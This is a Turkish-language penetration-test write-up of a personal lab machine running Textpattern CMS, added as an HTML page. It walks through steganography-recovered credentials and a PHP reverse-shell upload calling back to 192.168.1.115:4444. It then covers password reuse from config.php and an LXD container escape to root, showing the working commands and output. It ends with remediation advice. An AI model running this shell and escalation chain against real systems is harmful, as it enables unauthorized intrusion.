@@ -1,0 +1,529 @@
+<title>KB-VULN-4 — Sızma Testi Raporu</title>
+<style>
+  :root{
+    --bg:#F2F3F6;
+    --surface:#FFFFFF;
+    --surface-2:#E8EAF0;
+    --ink:#12151C;
+    --ink-soft:#545B6B;
+    --line:#D7DAE2;
+    --accent:#A87C1E;
+    --accent-ink:#FFFFFF;
+    --term-bg:#0D1117;
+    --term-ink:#C9D1D9;
+    --term-dim:#7D8590;
+    --good:#2E7D4F;
+    --crit:#B54747;
+    --shadow: 0 1px 2px rgba(18,21,28,0.04), 0 8px 24px -12px rgba(18,21,28,0.12);
+  }
+  @media (prefers-color-scheme: dark){
+    :root{
+      --bg:#0B0E14;
+      --surface:#12151D;
+      --surface-2:#171B26;
+      --ink:#E7E9EF;
+      --ink-soft:#9AA3B5;
+      --line:#232838;
+      --accent:#D9B453;
+      --accent-ink:#14151A;
+      --term-bg:#08090D;
+      --term-ink:#C9D1D9;
+      --term-dim:#6B7280;
+      --good:#4CAF7D;
+      --crit:#E07272;
+      --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 12px 32px -16px rgba(0,0,0,0.6);
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:#0B0E14; --surface:#12151D; --surface-2:#171B26; --ink:#E7E9EF; --ink-soft:#9AA3B5;
+    --line:#232838; --accent:#D9B453; --accent-ink:#14151A; --term-bg:#08090D; --term-ink:#C9D1D9;
+    --term-dim:#6B7280; --good:#4CAF7D; --crit:#E07272;
+    --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 12px 32px -16px rgba(0,0,0,0.6);
+  }
+  :root[data-theme="light"]{
+    --bg:#F2F3F6; --surface:#FFFFFF; --surface-2:#E8EAF0; --ink:#12151C; --ink-soft:#545B6B;
+    --line:#D7DAE2; --accent:#A87C1E; --accent-ink:#FFFFFF; --term-bg:#0D1117; --term-ink:#C9D1D9;
+    --term-dim:#7D8590; --good:#2E7D4F; --crit:#B54747;
+    --shadow: 0 1px 2px rgba(18,21,28,0.04), 0 8px 24px -12px rgba(18,21,28,0.12);
+  }
+
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--ink);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.65;
+    -webkit-font-smoothing:antialiased;
+  }
+  .page{
+    max-width:760px;
+    margin:0 auto;
+    padding:0 24px 96px;
+  }
+  a{color:var(--accent);}
+  a:focus-visible, button:focus-visible{outline:2px solid var(--accent); outline-offset:2px;}
+
+  h1,h2,h3{
+    font-family:"Iowan Old Style","Palatino Linotype",Palatino,Georgia,serif;
+    text-wrap:balance;
+    font-weight:600;
+    color:var(--ink);
+  }
+
+  /* ---- Cover ---- */
+  .cover{
+    padding:64px 0 40px;
+    border-bottom:1px solid var(--line);
+    margin-bottom:40px;
+  }
+  .cover-top{
+    display:flex;
+    align-items:center;
+    gap:20px;
+    margin-bottom:28px;
+  }
+  .kb-icon{
+    width:88px; height:88px;
+    border-radius:20px;
+    background:radial-gradient(circle at 30% 25%, #3A2E12, #0B0E1C 75%);
+    box-shadow:var(--shadow);
+    flex:none;
+    display:block;
+  }
+  .kb-icon .ln{stroke:rgba(217,180,83,0.5); stroke-width:1.4; fill:none;}
+  .kb-icon .st{fill:#ffffff;}
+  .kb-icon .st.glow{opacity:.3;}
+  .cover-eyebrow{
+    font-family:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",Menlo,monospace;
+    font-size:.72rem;
+    letter-spacing:.14em;
+    text-transform:uppercase;
+    color:var(--accent);
+    margin:0 0 6px;
+  }
+  .cover h1{
+    font-size:2.6rem;
+    margin:0;
+    line-height:1.05;
+  }
+  .cover p.dek{
+    max-width:56ch;
+    color:var(--ink-soft);
+    font-size:1.05rem;
+    margin:18px 0 0;
+  }
+  .meta-grid{
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:1px;
+    background:var(--line);
+    border:1px solid var(--line);
+    border-radius:10px;
+    overflow:hidden;
+    margin-top:32px;
+  }
+  .meta-cell{
+    background:var(--surface);
+    padding:14px 16px;
+  }
+  .meta-cell .k{
+    display:block;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.66rem;
+    letter-spacing:.08em;
+    text-transform:uppercase;
+    color:var(--ink-soft);
+    margin-bottom:5px;
+  }
+  .meta-cell .v{
+    font-size:.92rem;
+    font-weight:600;
+    font-variant-numeric:tabular-nums;
+  }
+  .v.diff{color:var(--good);}
+
+  /* ---- chain ---- */
+  .chain{
+    display:flex;
+    flex-wrap:wrap;
+    align-items:center;
+    gap:6px;
+    margin:36px 0 8px;
+  }
+  .chain .step{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.72rem;
+    letter-spacing:.03em;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    color:var(--ink);
+    padding:6px 11px;
+    border-radius:6px;
+    white-space:nowrap;
+  }
+  .chain .arrow{color:var(--ink-soft); font-size:.85rem;}
+
+  /* ---- sections ---- */
+  section{margin:56px 0;}
+  .section-label{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.72rem;
+    letter-spacing:.14em;
+    text-transform:uppercase;
+    color:var(--accent);
+    margin:0 0 8px;
+  }
+  h2{font-size:1.5rem; margin:0 0 4px;}
+  h3{font-size:1.1rem; margin:28px 0 10px; color:var(--ink);}
+  p{margin:14px 0; max-width:66ch;}
+  ul, ol{margin:14px 0; padding-left:1.3em; max-width:64ch;}
+  li{margin:6px 0;}
+  code.inline{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    padding:.12em .4em;
+    border-radius:4px;
+    font-size:.87em;
+  }
+
+  /* ---- terminal blocks ---- */
+  .term{
+    background:var(--term-bg);
+    border-radius:10px;
+    box-shadow:var(--shadow);
+    overflow:hidden;
+    margin:18px 0;
+  }
+  .term-bar{
+    display:flex;
+    align-items:center;
+    gap:6px;
+    padding:9px 12px;
+    border-bottom:1px solid rgba(255,255,255,0.06);
+  }
+  .term-bar .dot{width:9px; height:9px; border-radius:50%; background:#4b5062;}
+  .term-title{
+    margin-left:8px;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.7rem;
+    color:var(--term-dim);
+  }
+  .term pre{
+    margin:0;
+    padding:14px 16px 16px;
+    overflow-x:auto;
+    font-family:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",Menlo,monospace;
+    font-size:.82rem;
+    line-height:1.6;
+    color:var(--term-ink);
+  }
+  .term .p{color:var(--accent);}
+  .term .c{color:#7EC7A2;}
+  .term .o{color:var(--term-dim);}
+  .term .hit{color:#E8B563;}
+
+  /* ---- callouts ---- */
+  .callout{
+    border-left:3px solid var(--accent);
+    background:var(--surface);
+    border-radius:0 8px 8px 0;
+    padding:14px 18px;
+    margin:18px 0;
+    box-shadow:var(--shadow);
+  }
+  .callout .lbl{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.68rem;
+    letter-spacing:.1em;
+    text-transform:uppercase;
+    color:var(--accent);
+    display:block;
+    margin-bottom:6px;
+  }
+  .callout.crit{border-left-color:var(--crit);}
+  .callout.crit .lbl{color:var(--crit);}
+  .callout.good{border-left-color:var(--good);}
+  .callout.good .lbl{color:var(--good);}
+
+  table.simple{
+    width:100%;
+    border-collapse:collapse;
+    margin:18px 0;
+    font-size:.88rem;
+  }
+  table.simple th, table.simple td{
+    text-align:left;
+    padding:8px 10px;
+    border-bottom:1px solid var(--line);
+    font-variant-numeric:tabular-nums;
+  }
+  table.simple th{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.68rem;
+    letter-spacing:.06em;
+    text-transform:uppercase;
+    color:var(--ink-soft);
+    font-weight:600;
+  }
+  .sev{font-weight:700;}
+  .sev.crit{color:var(--crit);}
+  .sev.high{color:var(--accent);}
+  .sev.med{color:var(--ink-soft);}
+
+  .flag{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.85rem;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    padding:8px 12px;
+    border-radius:7px;
+  }
+  .flag .tick{color:var(--good); font-weight:700;}
+
+  footer{
+    margin-top:64px;
+    padding-top:20px;
+    border-top:1px solid var(--line);
+    color:var(--ink-soft);
+    font-size:.82rem;
+  }
+
+  @media (max-width:560px){
+    .meta-grid{grid-template-columns:repeat(2,1fr);}
+    .cover h1{font-size:2rem;}
+  }
+
+  @media print{
+    @page{ margin:14mm; }
+    *{
+      -webkit-print-color-adjust:exact !important;
+      print-color-adjust:exact !important;
+      color-adjust:exact !important;
+    }
+    body{background:#fff;}
+    .page{max-width:none;}
+    .term{box-shadow:none; border:1px solid #333;}
+    .callout{box-shadow:none;}
+    .term, .callout, .meta-grid, .flag, table.simple{break-inside:avoid;}
+    h2, h3, .section-label{break-after:avoid;}
+    .cover{break-inside:avoid;}
+  }
+</style>
+
+<div class="page">
+
+  <div class="cover">
+    <div class="cover-top">
+      <svg class="kb-icon" viewBox="0 0 88 88" aria-hidden="true">
+        <g class="ln">
+          <rect x="18" y="18" width="52" height="52" rx="6"/>
+          <path d="M30 30 L30 58 M30 44 L44 30 M30 44 L44 58"/>
+          <line x1="52" y1="30" x2="60" y2="30"/>
+          <line x1="52" y1="44" x2="60" y2="44"/>
+          <line x1="52" y1="58" x2="60" y2="58"/>
+        </g>
+        <circle class="st glow" cx="18" cy="18" r="5"/>
+        <circle class="st glow" cx="70" cy="70" r="6"/>
+      </svg>
+      <div>
+        <p class="cover-eyebrow">Kişisel Lab · Blackbox · Linux</p>
+        <h1>KB-VULN-4</h1>
+      </div>
+    </div>
+    <p class="dek">Textpattern CMS üzerinde OSINT ve steganografi ile ele geçirilen kimlik bilgileriyle başlayan, arbitrary file upload üzerinden RCE'ye, parola tekrar kullanımı üzerinden yatay geçişe ve LXD grup üyeliği sömürüsüyle root'a uzanan bir sızma testi süreci.</p>
+
+    <div class="meta-grid">
+      <div class="meta-cell"><span class="k">Hedef</span><span class="v">KB-Server (192.168.1.121)</span></div>
+      <div class="meta-cell"><span class="k">Tip</span><span class="v">Kişisel Lab</span></div>
+      <div class="meta-cell"><span class="k">İşletim Sistemi</span><span class="v">Linux</span></div>
+      <div class="meta-cell"><span class="k">Kategori</span><span class="v">Web / Textpattern CMS</span></div>
+    </div>
+
+    <div class="chain">
+      <span class="step">Recon</span><span class="arrow">→</span>
+      <span class="step">GitHub OSINT</span><span class="arrow">→</span>
+      <span class="step">Steganografi</span><span class="arrow">→</span>
+      <span class="step">Textpattern admin</span><span class="arrow">→</span>
+      <span class="step">File Upload RCE</span><span class="arrow">→</span>
+      <span class="step">www-data</span><span class="arrow">→</span>
+      <span class="step">config.php → parola reuse</span><span class="arrow">→</span>
+      <span class="step">machineboy</span><span class="arrow">→</span>
+      <span class="step">LXD sömürüsü</span><span class="arrow">→</span>
+      <span class="step">root</span>
+    </div>
+  </div>
+
+  <section>
+    <p class="section-label">Yönetici Özeti</p>
+    <h2>Bulgular özeti</h2>
+    <p>KB-Server (KB-VULN4) üzerinde siyah kutu (blackbox) sızma testi gerçekleştirilmiştir. Web uygulama zafiyetleri ve sistem yapılandırma hataları (LXD) zincirlenerek sistemin tam kontrolü (root) ele geçirilmiştir.</p>
+
+    <table class="simple">
+      <tr><th>Bulgu</th><th>Servis</th><th>Risk</th><th>CVSS</th></tr>
+      <tr><td>LXD Yetki Yükseltme</td><td>İşletim Sistemi (LXD Grubu)</td><td class="sev high">Yüksek</td><td>8.8</td></tr>
+      <tr><td>Zayıf Kimlik Bilgileri</td><td>Textpattern CMS Panel</td><td class="sev crit">Kritik</td><td>9.8</td></tr>
+      <tr><td>Arbitrary File Upload (RCE)</td><td>Textpattern CMS (Files Modülü)</td><td class="sev crit">Kritik</td><td>9.1</td></tr>
+      <tr><td>Parola Tekrar Kullanımı</td><td>Sistem Kullanıcısı (machineboy)</td><td class="sev high">Yüksek</td><td>7.8</td></tr>
+    </table>
+  </section>
+
+  <section>
+    <p class="section-label">01 — Keşif</p>
+    <h2>Port taraması ve Textpattern CMS tespiti</h2>
+    <p>Hedef sistemde (192.168.1.121) yapılan taramada tek açık servis bulundu: Port 80/TCP üzerinde çalışan bir Textpattern CMS kurulumu.</p>
+
+    <div class="callout">
+      <span class="lbl">Not</span>
+      Web servisi üzerinde yapılan keşif çalışmaları sırasında Textpattern CMS tespit edilmiş, yönetim paneline (<code class="inline">/textpattern</code>) erişilebildiği doğrulanmıştır.
+    </div>
+  </section>
+
+  <section>
+    <p class="section-label">02 — OSINT ve Steganografi</p>
+    <h2>GitHub deposu ve gizli veri deşifresi</h2>
+    <p>Açık kaynak istihbaratı (OSINT) sırasında sistem kullanıcısı <code class="inline">machineboy</code>'un GitHub hesabı tespit edildi. Hesap üzerinde yer alan <code class="inline">KB-DUMP</code> deposu klonlandı.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">git clone KB-DUMP</span></div>
+      <pre><span class="p">$</span> git clone https://github.com/machineboy141/KB-DUMP.git
+remote: Enumerating objects: 9, done.
+Receiving objects: 100% (9/9), 403.48 KiB | 1.42 MiB/s, done.
+
+<span class="p">$</span> cd KB-DUMP &amp;&amp; unzip KB-DUMP.zip
+Archive:  KB-DUMP.zip
+  inflating: deniz.jpg
+  inflating: elif.jpg
+  inflating: emre.jpg
+  inflating: mehmet.jpg
+  inflating: omer.jpg
+  inflating: serpil.jpg
+  inflating: yunus.jpg</pre>
+    </div>
+
+    <p>İndirilen görsel dosyaları üzerinde <code class="inline">steghide</code> ile toplu veri çıkarma (extract) denemesi yapıldı; boş parola ile iki dosyada gizli veri bulundu:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">steghide extract</span></div>
+      <pre><span class="p">$</span> for img in *.jpg; do steghide extract -sf "$img"; done
+steghide: could not extract any data with that passphrase!
+wrote extracted data to "steganopayload1125546.txt".
+steghide: could not extract any data with that passphrase!
+wrote extracted data to "steganopayload202720.txt".
+
+<span class="p">$</span> cat steganopayload1125546.txt | tr '\!~' 'P~\!O'
+<span class="hit">ezbircime2021</span>
+
+<span class="p">$</span> cat steganopayload202720.txt | tr '\!~' 'P~\!O'
+<span class="hit">admin</span></pre>
+    </div>
+
+    <p>Elde edilen kimlik bilgileri (<code class="inline">admin:ezbircime2021</code>), tahmin edilebilir ve güvenlik standartlarına uymayan bir parola olarak Textpattern yönetim paneline giriş için doğrulandı.</p>
+  </section>
+
+  <section>
+    <p class="section-label">03 — Foothold</p>
+    <h2>Arbitrary File Upload ile RCE</h2>
+    <p>Elde edilen kimlik bilgileriyle Textpattern admin paneline girildi. Panelin <code class="inline">Files</code> modülünün yüklenen dosyaların uzantılarını yeterince filtrelemediği tespit edildi — bu, sunucuya zararlı bir betik yükleyerek komut çalıştırmaya olanak tanıyordu.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">shell.php</span></div>
+      <pre>&lt;?php
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.115/4444 0&gt;&amp;1'");
+?&gt;</pre>
+    </div>
+
+    <p><code class="inline">shell.php</code>, Files modülü üzerinden yüklendi ve tarayıcı üzerinden tetiklenerek dinleyen netcat oturumuna bağlantı alındı:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">nc -lvnp 4444</span></div>
+      <pre><span class="p">$</span> nc -lvnp 4444
+Listening on any 4444 ...
+connect to [192.168.1.115] from (UNKNOWN) [192.168.1.121] 42040
+bash: cannot set terminal process group (1155): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="hit">www-data@kb-server</span>:/var/www/html/textpattern/files$ python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>
+    </div>
+
+    <div class="flag"><span class="tick">✓</span> www-data yetkisiyle uzaktan kod çalıştırma (RCE) sağlandı</div>
+  </section>
+
+  <section>
+    <p class="section-label">04 — Yatay Geçiş</p>
+    <h2>config.php ve parola tekrar kullanımı</h2>
+    <p>Textpattern kurulum dizininde bulunan yapılandırma dosyası okunarak veritabanı kimlik bilgileri ele geçirildi:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">cat textpattern/config.php</span></div>
+      <pre><span class="p">www-data@kb-server</span>:~/files$ cat /var/www/html/textpattern/textpattern/config.php
+$txpcfg['db'] = 'textpattern';
+$txpcfg['user'] = 'txtuser';
+<span class="hit">$txpcfg['pass'] = 'ghostroot510';</span>
+$txpcfg['host'] = 'localhost';</pre>
+    </div>
+
+    <p>Bu veritabanı şifresinin (<code class="inline">ghostroot510</code>), sistem kullanıcısı <code class="inline">machineboy</code> için de geçerli olduğu doğrulandı — klasik parola tekrar kullanımı:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">su machineboy</span></div>
+      <pre><span class="p">www-data@kb-server</span>:~/files$ su machineboy
+Password: <span class="hit">ghostroot510</span>
+<span class="p">machineboy@kb-server</span>:~$ cat /home/machineboy/user.txt</pre>
+    </div>
+
+    <div class="flag"><span class="tick">✓</span> user.txt ele geçirildi</div>
+  </section>
+
+  <section>
+    <p class="section-label">05 — Yetki Yükseltme</p>
+    <h2>LXD grup üyeliği sömürüsü</h2>
+    <p><code class="inline">machineboy</code> kullanıcısının imtiyazlı bir grup olan <code class="inline">lxd</code> grubuna dahil olduğu tespit edildi. Bu zafiyet, root yetkilerine sahip bir konteyner oluşturularak ana makinenin tüm dosya sistemine kısıtlama olmaksızın erişilmesine olanak tanır.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">id</span></div>
+      <pre><span class="p">machineboy@kb-server</span>:~$ id
+uid=1000(machineboy) gid=1000(machineboy) groups=1000(machineboy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),<span class="hit">108(lxd)</span></pre>
+    </div>
+
+    <p>Kali üzerinde <code class="inline">lxd-alpine-builder</code> ile bir Alpine imajı derlenip HTTP üzerinden hedefe aktarıldı, ardından root yetkili ve ana makinenin kök dizinini bağlayan bir konteyner başlatıldı:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">lxd konteyner sömürüsü</span></div>
+      <pre><span class="p">machineboy@kb-server</span>:/tmp$ wget http://192.168.1.115/alpine-v3.23-x86_64-...tar.gz
+Saving to: 'alpine-v3.23-x86_64-...tar.gz'
+
+<span class="p">machineboy@kb-server</span>:/tmp$ lxc image import ./alpine-v3.23...tar.gz --alias siber
+<span class="p">machineboy@kb-server</span>:/tmp$ lxc init siber siber_root -c security.privileged=true
+Creating siber_root
+<span class="p">machineboy@kb-server</span>:/tmp$ lxc config device add siber_root ana_disk disk source=/ path=/mnt/root recursive=true
+Device ana_disk added to siber_root
+<span class="p">machineboy@kb-server</span>:/tmp$ lxc start siber_root
+<span class="p">machineboy@kb-server</span>:/tmp$ lxc exec siber_root /bin/sh
+<span class="hit">~ # id</span>
+uid=0(root) gid=0(root)
+~ # cd /mnt/root/root &amp;&amp; cat root.txt</pre>
+    </div>
+
+    <div class="flag"><span class="tick">✓</span> root.txt ele geçirildi — sistem tamamen kompromize edildi</div>
+  </section>
+
+  <section>
+    <p class="section-label">Çözüm ve İyileştirme</p>
+    <h2>Öneriler</h2>
+    <ul>
+      <li>Kullanıcıların gerekmedikçe <code class="inline">lxd</code>/<code class="inline">lxc</code> gibi yüksek imtiyazlı gruplara eklenmemesi; grup üyeliklerinin "en az ayrıcalık ilkesi" çerçevesinde periyodik denetlenmesi.</li>
+      <li>CMS yönetim panellerinde NIST SP 800-63B standartlarına uygun parola politikası (min. 12 karakter, başarısız denemelerde hesap kilitleme).</li>
+      <li>Dosya yükleme modüllerinde sıkı bir beyaz liste (whitelist) uygulanması; <code class="inline">.php</code>, <code class="inline">.phtml</code>, <code class="inline">.exe</code> gibi çalıştırılabilir uzantıların kesinlikle engellenmesi.</li>
+      <li>Hassas yapılandırma dosyalarının (<code class="inline">config.php</code>) dosya izinlerinin ilgili servisle sınırlandırılması (<code class="inline">chmod 600</code>) ve farklı servisler için benzersiz parolalar kullanılması.</li>
+    </ul>
+  </section>
+
+  <footer>
+    Kişisel lab notu — KB-Server (192.168.1.121), eğitim/lab ortamı. Flag değerleri bu belgede paylaşılmamıştır.
+  </footer>
+
+</div>
